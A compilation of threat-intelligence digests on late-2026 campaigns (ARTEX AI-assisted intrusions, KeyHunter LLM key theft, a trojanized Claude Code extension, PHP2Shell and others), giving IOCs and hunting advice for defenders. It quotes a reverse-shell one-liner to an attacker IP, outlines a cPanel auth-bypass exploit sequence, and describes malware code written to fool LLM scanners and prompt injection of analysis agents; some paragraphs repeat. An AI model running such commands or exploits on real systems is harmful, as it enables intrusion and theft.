ARTEX, a Go-based AI-assisted offensive framework, was used in October 2026 intrusions by Vapor Panda and Storm-0940, targeting 200+ organizations across government, telecom, pharma, and defense.
Key findings:
- Vapor Panda (China-nexus) ran a single ARTEX controller against 200+ organizations in 14+ countries between 17-27 October 2026, confirming post-exploitation at nine. Attack chains varied: an XXE flaw plus unsigned SAML assertion reached cloud instance metadata at a U.S. 🇺🇸 pharma org granting admin commands to thousands of instances; a Greek 🇬🇷 government target was compromised using 2022 mail-server auth keys to forge an admin token and read mailboxes. BLOODALCHEMY malware was deployed via a GameHook executable renamed svchost.exe, alongside graphics-hook-filter64.dll and encrypted payload graphics-hook_config.bin (SHA-256s in the report). Operator instructions recovered in transcripts were issued in Chinese 🇨🇳, with agents using DeepSeek and one unidentified model, consuming roughly 1.4 billion input tokens in one intrusion.
- Storm-0940 abused compromised application identities tied to ConnectWise Cloud Backup to attempt access across 2,250+ Microsoft 365 tenants. Between 10-14 October, activity generated 151,000+ failed sign-ins against 327 accounts at eight organizations, peaking near 2,900 attempts per minute (T1110.003). In one tenant, a Cloud Management application self-assigned Global Administrator privileges and modified credentials on other applications in roughly five minutes (T1098.001, T1098.003).
- ARTEX leaves dense forensic traces despite its speed. Documented across separate investigations: 27 events in 23 seconds probing AWS permissions, roughly 240 log events from API and web-shell activity, and C2 callbacks through 491 rotating webhook[.]site URLs. Other cases included Kerberoasting (T1558.003), DCSync (T1003.006), and lateral movement via WinRM, Pass-the-Hash, and Pass-the-Ticket. Automation creates abrupt permission-check clusters, short-lived files, and rapid identity changes, not silence.
- BLOODALCHEMY C2 infrastructure: nginxmysql[.]com / 45.153.126[.]223, sqlserver-sqlite[.]com / 89.46.234[.]50, www.ddduuuppp[.]com / 192.121.47[.]20. Storm-0940 network indicators include 144.172.64[.]99, 144.172.64[.]60, 144.172.64[.]128, 187.15.88[.]186, 187.15.90[.]217, and 187.15.89[.]186.
Practitioner takeaway: Hunt C:\ProgramData\artx5v\, artex/artx5v process arguments, and artex-probe-* files as framework artifacts. For Storm-0940, pull Microsoft Entra service-principal sign-in and audit logs and review consent grants, new application credentials, and privileged role assignments. For the ConnectWise exposure, disabling the original integration is not sufficient: an attacker who added credentials to a secondary application retains access after vendor credential rotation. The report lists seven affected ConnectWise application identities; use the full vendor list for tenant review. Full IOC table and ATT&CK mapping are in the report.

item.title: KeyHunter Operation: Harvard Alumni Data, Stanford Applications and LLM Key Theft
item.description:
Chinese-speaking actor "leepsmarts" ran a seven-phase operation blending LLM API key theft, academic fraud across 20 universities, and parallel financial fraud channels, active from at least January through October 2026.
Key findings:
- The credential pipeline (KeyHunter + env_hunter v4.0) harvested 2,233 API keys from misconfigured PaaS deployments on Vercel, Netlify, Railway, Render, Replit and Cloudflare Pages, scanning 50 path variants including .env.backup, .env~, /.streamlit/secrets.toml and /wrangler.toml. Of 247 exposed LLM gateways catalogued, 223 responded as usable, surfacing GPT-4o, Claude Sonnet 4, DeepSeek R1/V3, Qwen3-Coder-480B and others. Only 12 of 2,233 keys were marked valid by the actor's own tooling, a 0.54% yield, but the operation compensated with volume and an AI_radar cron (grok-4.6, every 240 min) that monitored HuggingFace, GitHub, Hacker News and arXiv for new free API quotas before providers could tighten controls.
- The academic fraud track ran from an Oracle Cloud ARM node in Johor, Malaysia 🇲🇾, through the OpenClaw agent ([@]lsmarts_openclaw_bot). Eight scripted phases handled CalState registration with Playwright and reCAPTCHA Enterprise bypass, batch Outlook account creation (50 per session, 60+ SOCKS5 nodes across 14 countries), and biographical form completion under fabricated personas. Monetization channels included the GitHub Student Developer Pack, JetBrains licenses, NordVPN codes, NYU accounts sold for 250 yuan each, and application payment URLs for Stanford, UChicago, Wake Forest, Case Western and Central Michigan, suggesting a paid "application assistance" service targeting Chinese 🇨🇳 students.
- CVE-2026-41940 (cPanel and WHM authentication bypass, CVSS 9.8, CISA KEV) was staged as a four-stage exploit in cpanel_check.py: a pre-auth POST to /login/?login_only=1 to grab a session cookie, CRLF injection via the Authorization header to forge internal auth markers and obtain a cpsess token expiring at timestamp 9999999999, session propagation via /scripts2/listaccts, then WHM JSON API calls to /json-api/listaccts as root. Three universities were hardcoded targets: University of Utah (70.32.112[.]20), Arizona Christian University (165.22.159[.]246), and UTN Argentina 🇦🇷 (190.114.197[.]2). Agent logs show an incomplete attempt against arizonachristian[.]edu on May 1, 2026 that did not return a token. No successful exploitation is confirmed. A pre-staged Ed25519 SSH key (comment: sysadmin@internal) in the cpanel_persist file was ready to drop into authorized_keys post-exploitation.
- Financial fraud ran three parallel tracks: stripe_card_checker.py validated stolen cards in SAFE mode (no charge) using harvested Stripe sk_live keys, with CHARGE mode ($0.50 microcharge) for full confirmation, raw CVV data sourced from [@]juanwangccBOT (卷王二手CVV), a Chinese 🇨🇳 underground Telegram market advertising a 60%+ live rate. The [@]harmony0bot drainer cloned the official Harmony ONE repository, injected seed-phrase capture, and recorded phrase plus source IP plus User-Agent; real victim seed phrases were observed (source IP: 46.39.24[.]98), and analysis identified 15 related wallet addresses. The 195 Harvard alumni records (names, AAD numbers, [@]post.harvard[.]edu addresses) processed on August 16, 2026, trace to a torrent dataset linked to the November 2025 ShinyHunters incident, not a fresh intrusion into Harvard systems.
- The primary C2 at 209.112.91[.]74 exposed 110 files across 37 directories on port 8899 with directory listing enabled, including Telegram bot tokens that pivoted to the full actor infrastructure. A shared PentAGI CA certificate (JA4X fingerprint) tied 209.112.91[.]74, 173.231.39[.]244, 123.60.2[.]245 (pentagi.senhai[.]store) and 14.47.118[.]194 together. Actor domains include senhai[.]store, astrdark[.]cyou, xxtt[.]me, sajuai[.]xyz, web.712019[.]xyz, mail2.bfvdoor[.]com and new74.osxwrong[.]us[.]com. The .bash_history on the primary server contained a git clone command pulling directly from github[.]com/leepsmarts, linking the GitHub identity, Telegram handle [@]leepsmartsx, and the two agent bots into a single operator with high confidence.
Practitioner takeaway: Hunt your PaaS deployments and public repos for the 50 path variants env_hunter v4.0 targets, specifically .env.backup, .env~, /.streamlit/secrets.toml, /wrangler.toml and /firebase.json. If you run cPanel and WHM, check web logs for POST requests to /login/?login_only=1 with deliberate credential failures followed immediately by GET requests carrying a Base64-encoded Authorization header; that two-step sequence is the CVE-2026-41940 fingerprint. For the LLM key theft angle, audit API key usage for spikes from unexpected IPs or against model endpoints you do not use. Full IOCs (IPs, domains, Telegram handles) are in Annex A of the SOCRadar report; additional indicators are on the SOCRadar platform.

item.title: CA-26-045: Cursor Marketplace Claude Code Extension Supply Chain Compromise
item.description:
Trojanized Claude Code extension versions 2.1.312 and 2.1.313 hit Cursor's marketplace on Oct 29, delivering SSH backdoors to developer workstations. No user interaction required, just loading the extension module was enough.
Key details:
- The malicious builds were live in the Cursor VS Code Extension Marketplace from approximately 2:27 a.m. to 1:35 p.m. Pacific on Oct 29, 2026, targeting macOS and Windows. Microsoft Visual Studio Marketplace and the npm package [@]anthropic-ai/claude-code were confirmed unaffected. Anthropic's systems were not compromised; this was a supply-chain compromise of Cursor's distribution channel, not Claude Code itself. Version match alone does not confirm compromise: correlate installation source, timing, hashes, and payload indicators (T1195.002).
- The injected JavaScript executed at module load, no prompt, no click. It collected hostname, username, public IP, Git email configuration, and up to 40 environment-variable names matching secret-related terms. Public analysis does not confirm that secret values were transmitted in the initial beacon, but the inventory of variable names alone maps the credential surface of the workstation. The key persistence and tunnel components are the more urgent forensic concern (T1082).
- Persistence was written outside the extension directory, so uninstalling or updating the extension does not remove it. On macOS, hunt for the LaunchAgent com[.]apple.sysmond.plist (T1543.001). On Windows, look for the scheduled task named SysMon and the Startup entry sysmon.cmd (T1053.005). Both retry approximately every 60 seconds. The SSH authorized_keys file on both platforms should be inspected for the key labeled svc-telemetry (T1098.004).
- The payload attempted to enable Remote Login via systemsetup -setremotelogin, install OpenSSH Server on Windows, and establish a reverse SSH tunnel to 134.209.82[.]225 over TCP 22 and 8099, with HTTP POST beaconing to /beacon on the same host (T1572). The attacker server is offline following coordinated takedown, but keys and persistence artifacts may still be present and could be reactivated if the actor regains infrastructure.
Developer workstations are high-value initial-access targets: they frequently hold repository tokens, cloud credentials, signing keys, and CI/CD pipeline access. Treat any confirmed installation during the exposure window as a potential initial-access event. Before cleanup, preserve the VSIX, extension.js, SSH config, persistence files, and endpoint and network telemetry for the window. Then: audit authorized_keys for the svc-telemetry fingerprint, hunt for .smt, .smtk, and .stk_ hex-suffixed files alongside the named persistence artifacts, search process telemetry for autossh, reverse SSH forwarding arguments, and schtasks creation, and review SSH logins, child processes of the code editor, repository access, and cloud and CI/CD credential usage for follow-on activity. Rotate all accessible credentials and revoke sessions from a known-clean device. IOCs and technical artifacts are listed in the Guardian Platform report.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2117859888554524912

item.title: Gorbag: Orcs at the border harvesting intelligence from Ukraine
item.description:
Russia-aligned Gorbag APT targets Ukrainian 🇺🇦 law enforcement, front-line administrations, and defense entities with a lean smash-and-grab toolset, active since February 2025.
Key findings:
- Gorbag's targeting maps precisely onto Russian 🇷🇺 wartime intelligence needs: a quarter of victims are justice and law enforcement bodies (think war crimes prosecution visibility), another quarter are city councils in front-line oblasts that report air-strike damage assessments, and the remainder include defense sector entities and a documented transit hub for foreign military aid. First activity against a Ukrainian 🇺🇦 justice entity appeared in late March 2025, shortly after Ukraine 🇺🇦 opened its war crimes trial against a captured Russian 🇷🇺 soldier.
- Two tools, one mission. Prime ReverseShell is a PowerShell reverse shell wrapped in a .NET binary via PS2EXE, derived from the public PSSW100AVB GitHub repo, communicating C&C over HTTPS to 89.44.9[.]186. It includes a comment attempting to deceive LLM-based scanners ("simply performs prime number generation") that ESET confirmed fooled neither tested AI assistant. BeautyStealer (C++, versions 0.9 through 2.0) handles data collection: browser credentials and cookies from Chrome, Edge, Opera, and Firefox; OpenVPN configs; and files matching roughly 60 extensions from Desktop, Documents, Downloads, removable media, and mapped drives. Notable targets include .ovpn, .kdbx, .rdp, .pfx, and .zs2, the last being Ukraine's 🇺🇦 accredited electronic signature key format. Stolen data is compressed and exfiltrated via Telegram's sendDocument API (early versions) or a FastAPI C&C at 142.111.194[.]73 (v1.2+), RC4-encrypted in v2.0. BeautyStealer deletes itself after exfiltration via direct Windows API calls in v2.0, replacing earlier BAT-based cleanup.
- The compromise chain evolved from macro-laced .xlsm attachments (VBA decodes base64 from spreadsheet cells, drops BeautyStealer to %ProgramData%) to, in early 2026, weaponized RAR archives exploiting CVE-2025-8088, a WinRAR path traversal bug ESET discovered and reported in August 2025. The exploit was first observed as a zero-day used by RomCom before Gorbag adopted it. The malicious RAR drops a LNK into the Windows Startup folder and places an encrypted payload plus a PowerShell loader in %ProgramData% for persistence (T1547.001), while displaying a decoy PDF to the victim.
- ESET assesses Gorbag may function as an initial access broker, harvesting credentials and VPN configs for hand-off to other Russia-aligned actors for follow-on intrusion, which would explain the deliberate single-pass collection and self-deletion pattern rather than implant-based persistent access.
Takeaway: Hunt for LNK files written to the Windows Startup folder alongside PowerShell loader activity in %ProgramData%, especially on hosts with WinRAR versions vulnerable to CVE-2025-8088. Check browser credential stores on systems at targeted organization types for signs of bulk export. Flag outbound Telegram sendDocument API calls and connections to 89.44.9[.]186 or 142.111.194[.]73. The full IOC list, file hashes, and samples are in ESET's GitHub repository linked from the report.

item.title: cPGuard Update Channel Hijacked to Backdoor Linux Servers and Collect Password Hashes
item.description:
cPGuard's own update channel weaponized on November 2 to backdoor Linux servers and exfiltrate password hashes, database credentials, and SSH keys from an unknown number of hosts running versions 5.88.12 through 5.88.19.
Key details:
- The attacker used compromised credentials to access cPGuard's update infrastructure at 02:06 UTC and pushed a malicious script, cpguard-v58812-i91511[.]sh, inside updates versions 5.88.12 through 5.88.19. The script installed a backdoor shell at /var/tmp/.cpg91511_sh, staged collected files in /var/tmp/.cpg91511/, and packaged them as loot.tgz before uploading to an OPSSHIELD licensing server via a compromised account for later retrieval. OPSSHIELD estimated 32 files, each tied to a distinct customer server, were confirmed taken as of November 2 UTC.
- Files the script targeted: /etc/shadow and /etc/passwd, root's MariaDB or MySQL configuration (my.cnf), root's shell history, and SSH authorized_keys and known_hosts under /root/.ssh. The /etc/shadow hashes are crackable offline for weak or common passwords. Database configs and shell history carry plaintext secrets with no hash protection at all.
- The backdoor shell and staging directory are removed by version 5.88.25, so their absence is not proof the script never ran. The only reliable triage step the report gives is checking the update log: grep 'Successfully updated' /opt/cpguard/logs/install_log. Any entry for 5.88.12 through 5.88.19 means the affected update was installed, and that server must be treated as compromised even if it now runs the clean version. A missing or incomplete log does not clear the server.
- Credential exposure survives the update. Updating to 5.88.25 removes the backdoor but does not invalidate harvested hashes or keys. Any server that may have run the script requires password resets for root and all local accounts from a trusted recovery environment, rotation of database passwords and any secrets in shell history (S3 keys, DigitalOcean tokens), and replacement of SSH private keys under /root/.ssh with removal of the matching public keys from every trusting system. OPSSHIELD is separately pushing an update to remove its own support-access SSH public key from servers where it was added, and has not confirmed whether the matching private key was exposed.
Practitioner takeaway: Run the grep command against /opt/cpguard/logs/install_log on every cPGuard host immediately. Any hit in the 5.88.12-5.88.19 range triggers a full credential rotation scope: Linux account passwords, database credentials, secrets visible in shell history, and SSH keypairs, done from a clean, trusted environment, not the potentially backdoored host. Do not let a successful update to 5.88.25 close the incident; the attacker already has whatever was collected.

Any hit in the 5.88.12-5.88.19 range triggers a full credential rotation scope: Linux account passwords, database credentials, secrets visible in shell history, and SSH keypairs, done from a clean, trusted environment, not the potentially backdoored host. Do not let a successful update to 5.88.25 close the incident; the attacker already has whatever was collected.

item.title: Kimsuky Detection and Exploitation Analysis
item.description:
Kimsuky (G0094) tradecraft dissected through native Windows audit telemetry: a 3,087-event emulation maps LNK lures, hidden PowerShell, service and task persistence, and log clearing to the exact event IDs a defender needs to hunt.
Key findings:
- The emulation compresses a full Kimsuky kill chain into just over three minutes on a single domain controller. The chain opens with Event 1102 (Security log cleared at 15:02:41 UTC), then runs a dot-padded LNK lure (vvn.31.Pdf......Lnk), drops DefenderUpdate.Js to C:\Users\Public\Downloads\ for wscript.exe to execute, runs capture.Ps1 with -ExecutionPolicy Bypass -WindowStyle Hidden, launches mshta.exe against %TEMP%\D.21_SEOUL.hta, and places a masquerading binary under Public\Downloads\system32\smss.Exe. Every attacker command line is captured in the 49 Event ID 4688 process creation records, which carry most of the evidential weight here.
- Persistence lands on two channels. Service OrbitalTestSvc (Event ID 4697) launches hidden PowerShell via COMSPEC. Scheduled task \OrbitalHealthCheck (Event ID 4698) triggers on logon and runs svc_update.ps1 hidden. Account persistence comes via net.exe: local user adminuserz and group admingroupz are created, then Administrator is hidden from the logon screen by writing the Winlogon\SpecialAccounts\UserList registry value. These four mechanisms, service, task, hidden account, and registry suppression, are the persistence layer to verify and remove on any suspect DC.
- The 2026 campaign context matters for scoping. Operation GitPower (ongoing, with an October 2026 Ukrainian-diplomacy expansion) uses ZIP archives with LNK files posing as embassy correspondence, obfuscated PowerShell, and GitHub for staging and C2. The HTTPSpy wave ran March through April 2026 against South Korean 🇰🇷 military and corporate targets via spoofed installer pages. The groupware supply-chain compromise (2025 to early 2026) breached South Korean 🇰🇷 collaboration software vendors and pivoted to their customers. The dot-padded PDF LNK and logon-triggered task in this sample are consistent fingerprints across those campaigns.
- Because the target is a domain controller, the blast radius is domain-wide. A confirmed hit on a DC means planning a double krbtgt reset, not just a local remediation. The Security log was cleared before attacker activity ran, so pre-clearance evidence must be recovered from other sources: Sysmon, DNS debug logs, authentication logs on adjacent systems, or memory.
Practitioner takeaway: start your timeline at the 1102 event. Collect and hash everything under C:\Users\Public\Downloads\ and %TEMP%, confirm OrbitalTestSvc and \OrbitalHealthCheck are gone, revert Winlogon\SpecialAccounts\UserList, and reset the Administrator password before the krbtgt cycle. For proactive hunting, alert on script hosts (wscript.exe, cscript.exe, mshta.exe, powershell.exe) with parent paths in user-writable folders using 4688 command-line data, and treat any 1102 on a DC as an immediate incident trigger. Enable Script Block Logging and AMSI telemetry if they are not already on. The report names the specific event IDs (4688, 4697, 4698, 4699, 4702, 4720-4738, 5136, 1102) and artifact paths to build those detections from native Windows audit logs without additional tooling.

item.title: Stolen App Credentials, Real Access: An Actor Is Signing Into Entra ID and Azure DevOps as Your Workloads
item.description:
Active incident: an unknown actor is using stolen app credentials to sign into Microsoft Entra ID as service principals across multiple organizations, bypassing MFA and user-scoped Conditional Access entirely since November 1, 2026.
Key findings:
- The single confirmed malicious IP is 199.19.77[.]84 (AS203662, 3K33 sp. z o.o., Poland-geolocated hosting), active from Nov 1 through at least Nov 3 UTC. Every confirmed hit follows the same scripted sequence: Azure Resource Manager first, then Key Vault, Storage, Microsoft Graph, and Partner Center where available. Failed client-secret attempts (AADSTS7000215 for invalid secret, AADSTS7000222 for expired secret) followed seconds later by a success on the same app are the clearest hot indicator. That failure-then-success pattern means the actor holds a real credential and is confirming it works.
- This is a service principal authentication problem, not a user authentication problem. No MFA fires, no user-scoped Conditional Access policy applies, and perimeter firewalls never see the connection. The actor signed in using both client secrets and, in at least one confirmed case, a workload identity federated credential tied to Azure DevOps. Azure DevOps session cookies for two users were replayed on Nov 2, and PAT abuse is under active examination.
- The MSP blast radius is severe. Access to a managed service provider tenant was followed within seconds by lateral movement into downstream customer tenants via delegated admin and Partner Center. This turns one compromised app registration into a supply-chain pivot across every customer that MSP manages. T1199 (Trusted Relationship) is in play here, not just T1078.004 (Cloud Accounts).
- Activity is collection-focused, not persistent. Downloads of files from Microsoft 365 show interest in keys, API credentials, and client documentation. No persistence mechanism has been observed; dwell time per tenant is short. The actor uses scripted clients with custom user agents that rotate per task, complicating signature-based detection. The path from ARM to Key Vault (T1555.006) and Storage (T1530) means one stolen app credential can expose credentials for dozens of downstream systems.
- The hunt query Todyl provides targets AADServicePrincipalSignInLogs and AADNonInteractiveUserSignInLogs. Run: union AADServicePrincipalSignInLogs, AADNonInteractiveUserSignInLogs | where IPAddress == "199.19.77.84" | project TimeGenerated, AppId, ServicePrincipalName, UserPrincipalName, ClientCredentialType, ResultType, ResourceDisplayName. Push as far back as retention allows; Todyl notes earliest sightings sit at the edge of current query windows. For Azure DevOps, filter Organization Settings, Auditing (or the AzureDevOpsAuditing log) by IpAddress and review PAT creation, federated service connection changes, pipeline edits, and unfamiliar user agents. If DevOps auditing is off in your environment, enable it now.
Practitioner takeaway: if the IP appears in your logs, treat it as a confirmed data-exposure event. Immediately rotate all secrets, certificates, and federated credentials on affected service principals; note that issued tokens remain valid until expiry even after credential removal, so revoke Entra sessions and Azure DevOps PATs explicitly. Scope the damage by auditing Key Vault diagnostic logs, Storage logs, Entra audit logs, and the M365 unified audit log for secret reads and blob downloads from this IP. For Conditional Access, block 199.19.77[.]84/32 in a policy assigned directly to service principals, not groups, and note this requires the Workload ID Premium license and covers only single-tenant apps registered in your tenant. IOCs and behavioral detection guidance are in the Todyl report, which is being updated as the investigation continues.

item.title: Fake-download campaign uses trojanized installers to deliver monetization payloads
item.description:
Trojanized fake-download installers silently enroll victim machines into proxyware pools, distributed-compute networks, and adware bundles via a multi-offer Inno Setup delivery chain tracked by Microsoft Threat Intelligence.
Key findings:
- The attack chain begins when users run lures named as cracked commercial software, game installers, Roblox executors, or driver tools (T1204.002, T1036). The installer spawns an Inno Setup temporary runner under %TEMP%\is-*.tmp\ and launches numbered staged payloads: eld0.exe through eld5.exe and set_*.exe variants. Arguments /SL5, /SPAWNWND, and /FIRSTWND in the command line are durable process-tree signals that outlast the original lure filename and survive across lure categories.
- After staging, the runner sends per-offer HTTP callbacks to rotating infrastructure using a repeatable query pattern: d=inno with r=offer_execution or r=offer_execution_fail. Offer and download-network pairs (o=1712/dn=507 through o=1730/dn=567) coordinate which payload each slot delivers. A failed offer does not stop the chain. In some EDR traces, child payloads launched before the callback completed, so the callback is an attribution signal, not a prevention guarantee. Observed callback domains include beliefdesk[.]xyz, companyharbor[.]xyz, signalpane[.]cfd, inkact[.]xyz, and wishgrove[.]cfd, along with orbittrack[.]cfd, prairielink[.]cfd, willowbox[.]xyz, and others listed in the report's IOC section.
- Three confirmed monetization branches install silently via unattended switches (/qn, /S, /quiet, /norestart). WorldProxyPool (T1496) drops sdk-agent.exe under C:\Program Files\WorldProxyPool\ and creates three SYSTEM-level scheduled tasks: WorldProxyPoolAgent at startup, WorldProxyPoolWatchdog running a hidden noninteractive PowerShell script every five minutes (T1564.003, T1053.005), and WorldProxyPoolUpdater hourly. CharityEngine and BOINC install under C:\Program Files\BOINC\ and C:\ProgramData\BOINC\ alongside VirtualBox-7.2.8-r173730.msi to support distributed compute workloads. AW Manager installs AdvancedWindowsManager.exe and Windows Updater.exe under paths resembling %APPDATA%\AW Manager\Windows Manager 1.0.0\ or C:\Program Files (x86)\AW Manager\Windows Manager\.
- Seven SHA-256 hashes are provided in the report covering Inno runners, loaders, and staged eld payloads. Microsoft Defender detections tied to this chain include Trojan:Win64/OfferLoader.DA!MTB, Trojan:Win64/OfferLoader.DB!MTB, Behavior:Win32/SuspInnoOffer.A!mapsi, Adware:Win32/Clover, and Trojan:Win32/OffLoader.A. Defender for Endpoint alert names include "Suspicious scheduled task activity", "Suspicious Scheduled Task Process Launched", and "Suspicious 'SuspInnoOffer' behavior was blocked".
Practitioner takeaway: The report publishes three ready-to-run Microsoft Defender XDR advanced hunting queries covering Inno offer-execution callbacks (filter DeviceNetworkEvents for RemoteUrl containing d=inno plus r=offer_execution or r=offer_execution_fail), payload execution from Inno temp directories (DeviceProcessEvents where FolderPath matches \AppData\Local\Temp\is-* and FileName matches the eld/set_/FirstFast/SecondRunner pattern), and outbound connections to the listed callback domains. For hosts already showing these signals, pivot to scheduled task creation events: WorldProxyPoolAgent, WorldProxyPoolWatchdog, and WorldProxyPoolUpdater running as SYSTEM are a clean confirmation of the proxyware branch. Then audit software inventory for BOINC, VirtualBox, CharityEngine, and AW Manager installs the user did not initiate. Full IOCs, hashes, and MITRE mappings are in the report.

item.title: Designing a Malware Analysis Lab With REMnux
item.description:
A practical REMnux lab architecture for AI-assisted analysis: two VMs on a host-only network, one allowlisted egress path, and deliberate choices about where the agent runs and what it can reach.
Key details:
- The core network design places both the Windows VM and REMnux on a host-only virtual network with no internet access. The Windows VM uses REMnux as its default gateway and DNS server, so all sample traffic lands on REMnux, where fakedns redirects hostname lookups to the REMnux address and accept-all-ips handles IP-based connections. INetSim or a custom listener then responds on the targeted port, keeping the sample running so you can observe the next stage rather than watching it stall and exit.
- The AI agent placement decision carries real security weight. Running the agent on REMnux keeps it inside the disposable VM, so a prompt injection via malicious content in the sample acts there rather than on your workstation. Running it on your workstation is the higher-risk choice: a hijacked agent has access to your files, credentials, and network. If you choose the workstation path, sandbox the agent and limit what it can read and connect to, the same care you would apply on REMnux.
- REMnux's restrict-egress script controls outbound access from the VM. You list allowed destinations (domains, IPs, or CIDR ranges) in /etc/restrict-egress.conf and toggle the rules with sudo restrict-egress on or off. Keep the allowlist short, typically just the AI model's endpoint, because each allowed entry is a place a manipulated agent can send data or fetch a payload. Two limits to know: the default REMnux user has passwordless sudo and can disable these rules from inside the VM, and an allowed domain on a shared CDN covers everything behind it.
- Giving the Windows VM a temporary internet path requires routing through the REMnux NAT adapter. You enable ip_forward, override Docker's DROP forwarding policy with iptables -I FORWARD -j ACCEPT, and masquerade outbound traffic through the NAT interface. While that path is open, restrict-egress does not filter Windows VM traffic, the sample can reach live malicious infrastructure and your local network, and external operators see your public IP. A VPN such as AlgoVPN mitigates the attribution risk.
- The REMnux MCP server is worth understanding as an artifact boundary. It runs on the REMnux VM or container and gives the agent structured access to analysis tools rather than a raw shell. This matters forensically: an agent with only shell access must pick tools and parse raw output itself, increasing the chance it runs something unintended. The MCP server returns structured results and limits what ends up in the agent's context window, which reduces the surface for prompt injection to exploit.
Practitioner takeaway: before you run anything, decide two things: where the agent lives and what egress you allow. Start restrict-egress with only the AI model endpoint in /etc/restrict-egress.conf, verify the Windows VM has no path out that bypasses REMnux, and treat every addition to the allowlist as a conscious risk decision. The report walks through the full setup sequence and covers both VM and container deployment options.

While that path is open, restrict-egress does not filter Windows VM traffic, the sample can reach live malicious infrastructure and your local network, and external operators see your public IP. A VPN such as AlgoVPN mitigates the attribution risk.

- The REMnux MCP server is worth understanding as an artifact boundary. It runs on the REMnux VM or container and gives the agent structured access to analysis tools rather than a raw shell. This matters forensically: an agent with only shell access must pick tools and parse raw output itself, increasing the chance it runs something unintended. The MCP server returns structured results and limits what ends up in the agent's context window, which reduces the surface for prompt injection to exploit.

Practitioner takeaway: before you run anything, decide two things: where the agent lives and what egress you allow. Start restrict-egress with only the AI model endpoint in /etc/restrict-egress.conf, verify the Windows VM has no path out that bypasses REMnux, and treat every addition to the allowlist as a conscious risk decision. The report walks through the full setup sequence and covers both VM and container deployment options.

item.title: PHP2Shell Detection
item.description:
CVE-2026-109618 and CVE-2026-109619 (PHP2Shell), both CVSS v4.0 9.2, are actively exploited unauthenticated RCE flaws in PHP core. CISA added CVE-2026-109618 to KEV on 26 October 2026, with confirmed in-the-wild exploitation observed a day before fixes shipped.
Key findings:
- CVE-2026-109618 is an out-of-memory corruption bug: PHP leaves internal request data half-initialized on memory exhaustion, then trusts it during cleanup. CVE-2026-109619 is a stale global state bug: internal state outlives the request memory it points to, so a worker's next request can act on leftover data. Both reach code execution as the web server user with no authentication required. Every PHP branch below 8.5.12, 8.4.27, 8.3.36, and 8.2.35 is affected. PHP 7.4, 8.0, and 8.1 receive no official fix; PHP 7.3 and older including PHP 5 have no fix at all. PHP rates Apache mod_php at highest risk because exploitation can succeed before any application code runs.
- The attack chain in the analyzed 6-event log sample from web-prod-01 compressed the entire compromise into three seconds on 22 October 2026: a PHP fatal "Allowed memory size exhausted" error and a SIGSEGV crash of PHP-FPM child 1201 as the exploitation signal, followed immediately by php-fpm (running as www-data) spawning sh -c bash /dev/shm/.s, a script staged in RAM-backed storage, then a classic reverse shell: bash -i >& /dev/tcp/198.51.100[.]23/4444 0>&1. Persistence landed as a webshell at uploads/.cache.php loaded on every PHP request via a .user.ini auto_prepend_file directive.
- The log sample blended two source types into one ECS-style schema: plain-text PHP runtime and PHP-FPM error log lines alongside normalized file and process events from EDR telemetry. The PHP-FPM crash line was the first signal; the EDR file events revealed the persistence mechanism. Either source alone tells only half the story, which is the core argument for routing both PHP/PHP-FPM error logs and EDR telemetry into the same SIEM pipeline.
- Scope is wide: PHP-FPM, Apache mod_php, php-cgi, LiteSpeed, and FrankenPHP deployments are all in scope. Public PoC code and exploit frameworks appeared on GitHub within days of the 20 October 2026 social media leak. One research toolkit reports verified command execution as www-data across PHP 7.4 through 8.4 below the fixed releases. A separate, configuration-dependent session upload-progress vector (CVE-2026-115560) is not part of PHP2Shell but carries an interim mitigation of session.upload_progress.enabled = 0.
Practitioner takeaway: On any host you suspect was hit before patching, treat it as compromised, not just unpatched. Isolate the host, then preserve before you clean: copy uploads/.cache.php, .user.ini, and /dev/shm/.s now because /dev/shm is wiped on reboot. Block egress to 198.51.100[.]23:4444. Remove the auto_prepend_file directive from .user.ini and audit the entire web fleet for .user.ini files containing auto_prepend_file, hidden PHP files in upload folders, and process trees showing shells spawned by php-fpm, php-cgi, apache2, or httpd. Rotate every credential readable by www-data: database passwords, API keys, and application config secrets must be treated as exposed. For detection, alert on PHP memory exhaustion errors and PHP-FPM worker SIGSEGV crashes as the earliest exploitation signal, then correlate with child process spawns from web server parent processes. Patch to 8.5.12, 8.4.27, 8.3.36, or 8.2.35 and restart every PHP worker; PHP states no configuration change fully mitigates these flaws.
